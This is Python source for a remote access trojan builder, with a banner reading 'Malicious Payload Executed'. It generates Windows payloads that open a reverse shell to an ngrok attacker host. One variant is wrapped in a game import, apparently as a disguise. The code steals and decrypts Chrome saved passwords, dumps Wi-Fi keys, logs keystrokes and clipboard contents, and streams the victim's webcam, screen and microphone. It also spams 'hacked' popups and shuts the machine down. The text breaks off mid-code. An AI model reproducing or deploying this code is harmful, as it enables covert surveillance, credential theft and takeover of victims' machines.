# Copyright (c) 2024 Public Enemy Number 1. All rights reserved.

'''
ngrok is require for IPs and port attacker, ngrok tcp 8080 needs to be this port, 
there is Main.py file that is used to create a listener for webcam, screenshare and audio functions so the attacker use this command; default port is 8080
libraries 

ncat -lvnp 8080 for payload listener and for webcam ect.. needs to run the Main.py file for GUI

pip install socket subprocess os time ctypes random pickle opencv-python pyaudio numpy pynput pywin32 threading struct pyautogui re json base64 pysqlite3 pycryptodomex
tkinter random
'''

import os

attacker_ip = input("Attacker IP (must be the IPs from tcp connection from ngrok):")
attacker_p = input("Attacker Port(must be the port from tcp connection from ngrok):")

def clear_terminal():
    # Clear command for Windows
    if os.name == 'nt':
        os.system('cls')
    # Clear command for Linux/macOS
    else:
        os.system('clear')

clear_terminal()

e = "{e}"
public_url = "{public_url}"
web_cam = """{
    'webcam': 'Start webcam server',
    'screenshare': 'Start screen sharing',
    'upload': 'Start file upload server',
    'lockscreen': 'Lock target screen',
    'popups': 'annony the victim with popups',
    'shutdown': 'shutdown device',
    'reboot': 'reboot device',
    'extract_google_logins': 'extract_google_logins',
    'stop_webcam': 'stop camera',
    'stop_screenshare': 'Stop screen sharing',
    'help': 'help',
    'keylogs':'see the keys',
    'start_keylogger':'start_keylogger',
    'get_wifi_passwords': 'get_wifi_passwords from target',
    'get_clipboard_content': 'get_clipboard_content',
    'audio_real_time': 'audio_real_time',
    'stop_audio': 'stop_audio',
    'close_gif': 'close hack screen'

}"""
retry_interval = "{retry_interval}"
wifi = "{wifi.strip()}"

active_tunnel = "{active_tunnel.public_url}"
file_name = "{file_name}"
line = b"\n"
ngrok_extracted_path = "{ngrok_extracted_path}"
port = "{port}"
url = "{url}"
password = "{password}"
username = "{username}"
seq1 = "{'*' * 50}"
key = "{key}"
pass3 = "{password.group(1)}"

default_Script = f"""
import socket
import subprocess
import os
import time
import ctypes 
import random  
import pickle
import cv2  
import pyaudio
import numpy as np
from pynput.keyboard import Listener
import win32clipboard
import threading
import struct
import pyautogui
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil


# Define custom commands
CUSTOM_COMMANDS = {
    web_cam
}

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data" % (os.environ['USERPROFILE']))

def get_secret_key():
    try:
        # (1) Get secretkey from chrome local state
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        # (3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        # (4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None

def extract_google_logins():
    credentials = []
    try:
        # (1) Get secret key
        secret_key = get_secret_key()
        # Search user profile or default folder (this is where the encrypted login password is stored)
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
        for folder in folders:
            # (2) Get ciphertext from sqlite database
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url != "" and username != "" and ciphertext != "":
                        # (3) Filter the initialisation vector & encrypted password from ciphertext
                        # (4) Use AES algorithm to decrypt the password
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        credentials.append((url, username, decrypted_password))
                # Close database connection
                cursor.close()
                conn.close()
                # Delete temp login db
                os.remove("Loginvault.db")
        return credentials
    except Exception as e:
        return []




def execute_shell_command(command):
    try:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        if output.stdout:
            return output.stdout
        elif output.stderr:
            return output.stderr
        else:
            return "Command executed successfully, but there was no output."
    except Exception as e:
        return f"Error executing command: {e}"



def lock_screen():
    try:
        subprocess.run("rundll32.exe user32.dll, LockWorkStation", shell=True)
        return "Screen locked successfully."
    except Exception as e:
        return f"Failed to lock screen: {e}"

def trigger_popups():
    screen_width, screen_height = pyautogui.size()  # Get the screen size

    for _ in range(50):  # Number of message boxes
        x = random.randint(0, screen_width - 200)  # Random X position
        y = random.randint(0, screen_height - 100)  # Random Y position

        # Creating a thread for each message box with a random position
        threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(
            0,
            "You have been hacked!",
            "Warning",
            0x40 | 0x1 | 0x0)).start()

        # Move the message box window to a random position
        hwnd = ctypes.windll.user32.FindWindowW(None, "Warning")
        if hwnd:
            ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0001 | 0x0004 | 0x0010)

        time.sleep(0.05)   

def shutdown_device():
    os.system("shutdown /s /t 1")

def reboot_device():
    os.system("shutdown /r /t 1")

    
stop_webcam_streaming = threading.Event()
stop_screenshot_streaming = threading.Event()

def stream_webcam_to_server(server_ip, server_port, retry_interval=1):
    while not stop_webcam_streaming.is_set():
        try:
            # Create socket connection
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))

            # Initialize webcam
            cap = cv2.VideoCapture(0)

            while not stop_webcam_streaming.is_set():
                ret, frame = cap.read()
                if not ret:
                    break

                # Serialize the frame
                data = pickle.dumps(frame)

                # Send data size first
                client_socket.sendall(struct.pack("L", len(data)))
                # Send data
                client_socket.sendall(data)

        except ConnectionResetError as e:
            print(f"Connection reset by server: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        except socket.error as e:
            print(f"Socket error: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        finally:
            cap.release()
            client_socket.close()
            if stop_webcam_streaming.is_set():
                break

def stream_screenshot_to_server(server_ip, server_port, retry_interval=1):
    while not stop_webcam_streaming.is_set():
        try:
            # Create socket connection
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))

            while not stop_webcam_streaming.is_set():
                # Capture screenshot
                screen = pyautogui.screenshot()
                # Convert the screenshot to a format suitable for sending
                screen_np = np.array(screen)
                _, screen_encoded = cv2.imencode('.jpg', screen_np)
                screen_data = screen_encoded.tobytes()
                
                # Send data size first
                client_socket.sendall(struct.pack("L", len(screen_data)))
                # Send data
                client_socket.sendall(screen_data)

        except ConnectionResetError as e:
            print(f"Connection reset by server: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        except socket.error as e:
            print(f"Socket error: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        finally:
            client_socket.close()
            if stop_webcam_streaming.is_set():
                break

                
key_log = []

def on_press(key):
    try:
        key_log.append(key.char)  # Logs printable characters
    except AttributeError:
        key_log.append(f"[{key}]")  # Logs special keys like Shift, Ctrl, etc.

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def get_key_logs():
    if key_log:
        return ''.join(key_log)
    return "No keys logged yet."

def clear_key_logs():
    global key_log
    key_log = []

ATTACKER_IP = "{attacker_ip}"
ATTACKER_PORT = {attacker_p}

def get_wifi_passwords():
    try:
        profiles = subprocess.check_output("netsh wlan show profiles").decode()
        wifi_list = re.findall(r"All User Profile\s*:\s*(.*)", profiles)
        result = []
        for wifi in wifi_list:
            password_info = subprocess.check_output(f"netsh wlan show profile name=\\"{wifi}\\" key=clear").decode()
            password = re.search(r"Key Content\s*:\s*(.*)", password_info)
            if password:
                result.append(f"WiFi: {wifi} - Password: {pass3}")
            else:
                result.append(f"WiFi: {wifi} - No password found")
        return "\\n".join(result)
    except Exception as e:
        return f"Failed to retrieve Wi-Fi passwords: {e}"


clipboard_history = []

def monitor_clipboard():
    last_data = None
    while True:
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            # If the clipboard content has changed, add it to history
            if clipboard_data != last_data:
                clipboard_history.append(clipboard_data)
                last_data = clipboard_data
        except Exception:
            pass

        # Delay before checking again
        time.sleep(2)

def get_clipboard_content():
    if clipboard_history:
        return "\\n".join(clipboard_history)
    else:
        return "No clipboard data available."

clipboard_thread = None

server_ip = ATTACKER_IP
server_port = ATTACKER_PORT

chunk_size = 1024
audio_format = pyaudio.paInt16
channels = 1
rate = 44100

stop_audio_streaming = threading.Event()

# Global variable for controlling audio streaming
audio_streaming = True
audio_thread = None


def stream_audio_to_server():
    p = pyaudio.PyAudio()
    
    # Initialize the audio stream
    stream = p.open(format=audio_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk_size)
    
    client_socket = None
    while audio_streaming:
        try:
            if client_socket is None:
                # Attempt to connect to the server
                print("Trying to connect to server...")
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((server_ip, server_port))
                print("Connected to server.")
            
            while audio_streaming and not stop_audio_streaming.is_set():
                # Read audio chunk from microphone
                data = stream.read(chunk_size)

                # Send data size first
                client_socket.sendall(struct.pack("L", len(data)))

                # Send audio data
                client_socket.sendall(data)
        except socket.error as e:
            print(f"Connection error: {e}")
            client_socket = None
            time.sleep(1)  # Retry after 1 seconds if connection fails
        except Exception as e:
            print(f"Streaming error: {e}")
            break
    
    # Cleanup after stopping the stream
    stream.stop_stream()
    stream.close()
    p.terminate()
    if client_socket:
        client_socket.close()

def reverse_shell():

    global clipboard_thread

    # Start the clipboard monitoring thread
    if clipboard_thread is None:
        clipboard_thread = threading.Thread(target=monitor_clipboard)
        clipboard_thread.daemon = True  # This ensures the thread will stop when the program exits
        clipboard_thread.start()

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ATTACKER_IP, ATTACKER_PORT))
            color = b"\\033[32m"
            banner = b'''
            
 __  __   ____   ______ 
|  \/  | |  _ \ |  ____|
| \  / | | |_) || |__   
| |\/| | |  _ / |  __|  
| |  | | | |    | |____ 
|_|  |_| |_|    |______|
                       
          Malicious Payload Executed
                 Version: 4.5
              created by PhantomCode
              
          Type 'exit' to terminate process
          Type 'help' to see all cammands
                              
            '''
 
            client.send(color + banner)
            

            while True:
                client.send({line})
                client.send(b"CMD:")
                command = client.recv(1024).decode('utf-8').strip()

                # Check if the command is a custom command
                if command.lower() in CUSTOM_COMMANDS:
                    if command.lower() == 'webcam':
                        if webcam_thread is None or not webcam_thread.is_alive():
                            stop_webcam_streaming.clear()  
                            client.send(b"[INFO] Starting webcam stream...")
                            webcam_thread = threading.Thread(target=stream_webcam_to_server, args=(ATTACKER_IP, ATTACKER_PORT))
                            webcam_thread.start()
                        else:
                            client.send(b"[INFO] Webcam stream is already running.")

                    elif command.lower() == 'stop_webcam':
                        if webcam_thread and webcam_thread.is_alive():
                            client.send(b"[INFO] Stopping webcam stream...")
                            stop_webcam_streaming.set()  # Signal the webcam thread to stop
                            webcam_thread.join()  # Wait for the thread to finish
                        else:
                            client.send(b"[INFO] Webcam stream is not running.")

                    elif command.lower() == "audio_real_time":
                        if not audio_streaming:
                            # Start the audio streaming in a separate thread
                            audio_streaming = True
                            stop_audio_streaming.clear()  # Ensure the stop event is not set
                            audio_thread = threading.Thread(target=stream_audio_to_server)
                            audio_thread.daemon = True  # Ensure thread exits when the main program does
                            audio_thread.start()
                            print("Audio streaming started.")
                        else:
                            print("Audio streaming is already running.")
                            
                    elif command.lower() == "stop_audio":
                        if audio_streaming:
                            # Stop the audio streaming
                            audio_streaming = False
                            stop_audio_streaming.set()  # Signal the audio thread to stop
                            
                            print("Audio streaming stopped.")
                        else:
                            print("Audio streaming is not running.")

                    elif command.lower() == 'get_wifi_passwords':
                        try:
                            wifi_passwords = get_wifi_passwords()
                            banner = b'''
                            ##############################
                            #      Wi-Fi Passwords       #
                            ##############################
                            '''
                            client.send(color + banner)
                            client.send(b"\\n\\n")
                            client.send(wifi_passwords.encode())  
                        except Exception as e:
                            print(f"Failed to send data: {e}")
                        except Exception as e:
                            client.send(f"Failed to retrieve Wi-Fi passwords: {e}".encode())

                    elif command == "help":
                        help = b'''
            
            this a reverse shell payload with custom commands! 
                        
            usange:

            webcam: see the victim real-time camera. but to open the cv2 GUI need to run the Main.py file

            screenshare: see the victim real-time screen.but to open the cv2 GUI need to run the Main.py file

            lockscreen: type and the target screen will be locked!

            popups: annony the victim with popups

            shutdown: shutdown device
            reboot: reboot device

            copy "C:\Path\To\Your\File.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

            extract_google_logins : extract_google_logins like passwords and usernames

            stop_screenshare: will stop screen-sharing
            stop_webcam: will stop webcam-sharing
            keylogs: see the keys
            start_keylogger: start_keylogger to get the keys.
            get_wifi_passwords: get wifi credentials

            get_clipboard_content : see what the victim has in it clipboard.
            audio_real_time: hear real time what victim says.
            stop_audio : stop_audio real time

            '''        
                        client.send(help)        

                    elif command == "shutdown":
                       shutdown_device()

                    elif command.lower() == 'get_clipboard_content':
                        banner = b'''
                            ##############################
                            #      clipboard data        #
                            ##############################
                            '''
                        client.send(color + banner)
                        client.send(b"\\n\\n")
                        clipboard_data = get_clipboard_content()
                        client.send(clipboard_data.encode())

                    elif command.lower() == 'keylogs':
                        logs = get_key_logs()
                        client.send(logs.encode('utf-8'))
                        clear_key_logs()

                    elif command.lower() == 'start_keylogger':
                        client.send(b"Starting keylogger...")
                        threading.Thread(target=start_keylogger).start()

                    elif command == "reboot":
                        reboot_device()

                    elif command.lower() == 'popups':
                        client.send(b"[INFO] Triggering pop-up message boxes...")
                        threading.Thread(target=trigger_popups).start()    

                    elif command.lower() == 'lockscreen':
                        # Bloqueia a tela do alvo
                        output = lock_screen()
                        client.send(output.encode())

                    elif command.lower() == 'extract_google_logins':
                        logins = extract_google_logins()
                        for login in logins:
                            url, username, password = login
                            message = f"URL: {url}\\n User Name: {username}\\n Password: {password}\\n{seq1}\\n"
                            client.send(message.encode('utf-8'))

                    elif command.lower() == 'screenshare':
                        if screenshot_thread is None or not screenshot_thread.is_alive():
                            client.send(b"[INFO] Starting screen sharing...")
                            stop_webcam_streaming.clear()  # Ensure the stop flag is not set
                            screenshot_thread = threading.Thread(target=stream_screenshot_to_server, args=(ATTACKER_IP, ATTACKER_PORT))
                            screenshot_thread.start()
                        else:
                            client.send(b"[INFO] Screen sharing is already running.")

                    elif command.lower() == 'stop_screenshare':
                        if screenshot_thread and screenshot_thread.is_alive():
                            client.send(b"[INFO] Stopping screen sharing...")
                            stop_webcam_streaming.set()  # Signal the screen sharing thread to stop
                            screenshot_thread.join()  # Wait for the thread to finish
                        else:
                            client.send(b"[INFO] Screen sharing is not running.")

                    elif command.lower() == 'lockscreen':
                        # Bloqueia a tela do alvo
                        output = lock_screen()
                        client.send(output.encode())


                elif command.lower() == 'exit':
                    break

                elif command.startswith("cd "):
                    try:
                        os.chdir(command.strip("cd "))
                        client.send(b"Changed directory to " + os.getcwd().encode())
                    except FileNotFoundError as e:
                        client.send(f"Error: {e}".encode())
                    except Exception as e:
                        client.send(f"Error: {e}".encode())

                else:
                    # If not a custom command, treat it as a shell command
                    output = execute_shell_command(command)
                    if output:
                        client.send(output.encode())
                    else:
                        client.send({line})
                        client.send(b"No output from the command.")
                        client.send({line})

        except ConnectionResetError:
            print("[ERROR] Connection reset by peer.")
            stop_webcam_streaming.set()
            audio_streaming = False
            stop_audio_streaming.set()
            stop_screenshot_streaming.set()
        except Exception as e:
            print(f"Connection lost: {e}")
            stop_webcam_streaming.set()
            audio_streaming = False
            stop_audio_streaming.set()
            stop_screenshot_streaming.set()
            time.sleep(2)
        finally:
            client.close()
            webcam_thread = None
            screenshot_thread = None
            clipboard_thread = None
            audio_streaming = None


if __name__ == "__main__":
    reverse_shell()

"""

game = f""" 
import socket
import subprocess
import os
import time
import ctypes 
import random  
import pickle
import cv2  
import pyaudio
import numpy as np
from pynput.keyboard import Listener
import win32clipboard
import threading
import struct
import pyautogui
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from Game import main


# Define custom commands
CUSTOM_COMMANDS = {
    web_cam
}

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data" % (os.environ['USERPROFILE']))

def get_secret_key():
    try:
        # (1) Get secretkey from chrome local state
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        # (3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        # (4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None

def extract_google_logins():
    credentials = []
    try:
        # (1) Get secret key
        secret_key = get_secret_key()
        # Search user profile or default folder (this is where the encrypted login password is stored)
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
        for folder in folders:
            # (2) Get ciphertext from sqlite database
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url != "" and username != "" and ciphertext != "":
                        # (3) Filter the initialisation vector & encrypted password from ciphertext
                        # (4) Use AES algorithm to decrypt the password
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        credentials.append((url, username, decrypted_password))
                # Close database connection
                cursor.close()
                conn.close()
                # Delete temp login db
                os.remove("Loginvault.db")
        return credentials
    except Exception as e:
        return []




def execute_shell_command(command):
    try:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        if output.stdout:
            return output.stdout
        elif output.stderr:
            return output.stderr
        else:
            return "Command executed successfully, but there was no output."
    except Exception as e:
        return f"Error executing command: {e}"



def lock_screen():
    try:
        subprocess.run("rundll32.exe user32.dll, LockWorkStation", shell=True)
        return "Screen locked successfully."
    except Exception as e:
        return f"Failed to lock screen: {e}"

def trigger_popups():
    screen_width, screen_height = pyautogui.size()  # Get the screen size

    for _ in range(50):  # Number of message boxes
        x = random.randint(0, screen_width - 200)  # Random X position
        y = random.randint(0, screen_height - 100)  # Random Y position

        # Creating a thread for each message box with a random position
        threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(
            0,
            "You have been hacked!",
            "Warning",
            0x40 | 0x1 | 0x0)).start()

        # Move the message box window to a random position
        hwnd = ctypes.windll.user32.FindWindowW(None, "Warning")
        if hwnd:
            ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0001 | 0x0004 | 0x0010)

        time.sleep(0.05)   

def shutdown_device():
    os.system("shutdown /s /t 1")

def reboot_device():
    os.system("shutdown /r /t 1")

    
stop_webcam_streaming = threading.Event()
stop_screenshot_streaming = threading.Event()

def stream_webcam_to_server(server_ip, server_port, retry_interval=1):
    while not stop_webcam_streaming.is_set():
        try:
            # Create socket connection
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))

            # Initialize webcam
            cap = cv2.VideoCapture(0)

            while not stop_webcam_streaming.is_set():
                ret, frame = cap.read()
                if not ret:
                    break

                # Serialize the frame
                data = pickle.dumps(frame)

                # Send data size first
                client_socket.sendall(struct.pack("L", len(data)))
                # Send data
                client_socket.sendall(data)

        except ConnectionResetError as e:
            print(f"Connection reset by server: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        except socket.error as e:
            print(f"Socket error: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        finally:
            cap.release()
            client_socket.close()
            if stop_webcam_streaming.is_set():
                break

def stream_screenshot_to_server(server_ip, server_port, retry_interval=1):
    while not stop_webcam_streaming.is_set():
        try:
            # Create socket connection
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))

            while not stop_webcam_streaming.is_set():
                # Capture screenshot
                screen = pyautogui.screenshot()
                # Convert the screenshot to a format suitable for sending
                screen_np = np.array(screen)
                _, screen_encoded = cv2.imencode('.jpg', screen_np)
                screen_data = screen_encoded.tobytes()
                
                # Send data size first
                client_socket.sendall(struct.pack("L", len(screen_data)))
                # Send data
                client_socket.sendall(screen_data)

        except ConnectionResetError as e:
            print(f"Connection reset by server: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        except socket.error as e:
            print(f"Socket error: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)
        finally:
            client_socket.close()
            if stop_webcam_streaming.is_set():
                break

                
key_log = []

def on_press(key):
    try:
        key_log.append(key.char)  # Logs printable characters
    except AttributeError:
        key_log.append(f"[{key}]")  # Logs special keys like Shift, Ctrl, etc.

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def get_key_logs():
    if key_log:
        return ''.join(key_log)
    return "No keys logged yet."

def clear_key_logs():
    global key_log
    key_log = []

ATTACKER_IP = "{attacker_ip}"
ATTACKER_PORT = {attacker_p}

def get_wifi_passwords():
    try:
        profiles = subprocess.check_output("netsh wlan show profiles").decode()
        wifi_list = re.findall(r"All User Profile\s*:\s*(.*)", profiles)
        result = []
        for wifi in wifi_list:
            password_info = subprocess.check_output(f"netsh wlan show profile name=\\"{wifi}\\" key=clear").decode()
            password = re.search(r"Key Content\s*:\s*(.*)", password_info)
            if password:
                result.append(f"WiFi: {wifi} - Password: {pass3}")
            else:
                result.append(f"WiFi: {wifi} - No password found")
        return "\\n".join(result)
    except Exception as e:
        return f"Failed to retrieve Wi-Fi passwords: {e}"


clipboard_history = []

def monitor_clipboard():
    last_data = None
    while True:
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            # If the clipboard content has changed, add it to history
            if clipboard_data != last_data:
                clipboard_history.append(clipboard_data)
                last_data = clipboard_data
        except Exception:
            pass

        # Delay before checking again
        time.sleep(2)

def get_clipboard_content():
    if clipboard_history:
        return "\\n".join(clipboard_history)
    else:
        return "No clipboard data available."

clipboard_thread = None

server_ip = ATTACKER_IP
server_port = ATTACKER_PORT

chunk_size = 1024
audio_format = pyaudio.paInt16
channels = 1
rate = 44100

stop_audio_streaming = threading.Event()

# Global variable for controlling audio streaming
audio_streaming = True
audio_thread = None


def stream_audio_to_server():
    p = pyaudio.PyAudio()
    
    # Initialize the audio stream
    stream = p.open(format=audio_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk_size)
    
    client_socket = None
    while audio_streaming:
        try:
            if client_socket is None:
                # Attempt to connect to the server
                print("Trying to connect to server...")
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((server_ip, server_port))
                print("Connected to server.")
            
            while audio_streaming and not stop_audio_streaming.is_set():
                # Read audio chunk from microphone
                data = stream.read(chunk_size)

                # Send data size first
                client_socket.sendall(struct.pack("L", len(data)))

                # Send audio data
                client_socket.sendall(data)
        except socket.error as e:
            print(f"Connection error: {e}")
            client_socket = None
            time.sleep(1)  # Retry after 1 seconds if connection fails
        except Exception as e:
            print(f"Streaming error: {e}")
            break
    
    # Cleanup after stopping the stream
    stream.stop_stream()
    stream.close()
    p.terminate()
    if client_socket:
        client_socket.close()

def open_game():
    main()

def reverse_shell():

    global clipboard_thread

    # Start the clipboard monitoring thread
    if clipboard_thread is None:
        clipboard_thread = threading.Thread(target=monitor_clipboard)
        clipboard_thread.daemon = True  # This ensures the thread will stop when the program exits
        clipboard_thread.start()

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ATTACKER_IP, ATTACKER_PORT))
            color = b"\\033[32m"
            banner = b'''
            
 __  __   ____   ______ 
|  \/  | |  _ \ |  ____|
| \  / | | |_) || |__   
| |\/| | |  _ / |  __|  
| |  | | | |    | |____ 
|_|  |_| |_|    |______|
                       
          Malicious Payload Executed
                 Version: 4.5
              created by PhantomCode
              
          Type 'exit' to terminate process
          Type 'help' to see all cammands
                              
            '''
 
            client.send(color + banner)
            

            while True:
                client.send({line})
                client.send(b"CMD:")
                command = client.recv(1024).decode('utf-8').strip()

                # Check if the command is a custom command
                if command.lower() in CUSTOM_COMMANDS:
                    if command.lower() == 'webcam':
                        if webcam_thread is None or not webcam_thread.is_alive():
                            stop_webcam_streaming.clear()  
                            client.send(b"[INFO] Starting webcam stream...")
                            webcam_thread = threading.Thread(target=stream_webcam_to_server, args=(ATTACKER_IP, ATTACKER_PORT))
                            webcam_thread.start()
                        else:
                            client.send(b"[INFO] Webcam stream is already running.")

                    elif command.lower() == 'stop_webcam':
                        if webcam_thread and webcam_thread.is_alive():
                            client.send(b"[INFO] Stopping webcam stream...")
                            stop_webcam_streaming.set()  # Signal the webcam thread to stop
                            webcam_thread.join()  # Wait for the thread to finish
                        else:
                            client.send(b"[INFO] Webcam stream is not running.")

                    elif command.lower() == "audio_real_time":
                        if not audio_streaming:
                            # Start the audio streaming in a separate thread
                            audio_streaming = True
                            stop_audio_streaming.clear()  # Ensure the stop event is not set
                            audio_thread = threading.Thread(target=stream_audio_to_server)
                            audio_thread.daemon = True  # Ensure thread exits when the main program does
                            audio_thread.start()
                            print("Audio streaming started.")
                        else:
                            print("Audio streaming is already running.")
                            
                    elif command.lower() == "stop_audio":
                        if audio_streaming:
                            # Stop the audio streaming
                            audio_streaming = False
                            stop_audio_streaming.set()  # Signal the audio thread to stop
                            
                            print("Audio streaming stopped.")
                        else:
                            print("Audio streaming is not running.")

                    elif command.lower() == 'get_wifi_passwords':
                        try:
                            wifi_passwords = get_wifi_passwords()
                            banner = b'''
                            ##############################
                            #      Wi-Fi Passwords       #
                            ##############################
                            '''
                            client.send(color + banner)
                            client.send(b"\\n\\n")
                            client.send(wifi_passwords.encode())  
                        except Exception as e:
                            print(f"Failed to send data: {e}")
                        except Exception as e:
                            client.send(f"Failed to retrieve Wi-Fi passwords: {e}".encode())

                    elif command == "help":
                        help = b'''
            
            this a reverse shell payload with custom commands! 
                        
            usange:

            webcam: see the victim real-time camera. but to open the cv2 GUI need to run the Main.py file

            screenshare: see the victim real-time screen.but to open the cv2 GUI need to run the Main.py file

            lockscreen: type and the target screen will be locked!

            popups: annony the victim with popups

            shutdown: shutdown device
            reboot: reboot device

            copy "C:\Path\To\Your\File.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

            extract_google_logins : extract_google_logins like passwords and usernames

            stop_screenshare: will stop screen-sharing
            stop_webcam: will stop webcam-sharing
            keylogs: see the keys
            start_keylogger: start_keylogger to get the keys.
            get_wifi_passwords: get wifi credentials

            get_clipboard_content : see what the victim has in it clipboard.
            audio_real_time: hear real time what victim says.
            stop_audio : stop_audio real time

            '''        
                        client.send(help)        

                    elif command == "shutdown":
                       shutdown_device()

                    elif command.lower() == 'get_clipboard_content':
                        banner = b'''
                            ##############################
                            #      clipboard data        #
                            ##############################
                            '''
                        client.send(color + banner)
                        client.send(b"\\n\\n")
                        clipboard_data = get_clipboard_content()
                        client.send(clipboard_data.encode())

                    elif command.lower() == 'keylogs':
                        logs = get_key_logs()
                        client.send(logs.encode('utf-8'))
                        clear_key_logs()

                    elif command.lower() == 'start_keylogger':
                        client.send(b"Starting keylogger...")
                        threading.Thread(target=start_keylogger).start()

                    elif command == "reboot":
                        reboot_device()

                    elif command.lower() == 'popups':
                        client.send(b"[INFO] Triggering pop-up message boxes...")
                        threading.Thread(target=trigger_popups).start()    

                    elif command.lower() == 'lockscreen':
                        # Bloqueia a tela do alvo
                        output = lock_screen()
                        client.send(output.encode())

                    elif command.lower() == 'extract_google_logins':
                        logins = extract_google_logins()
                        for login in logins:
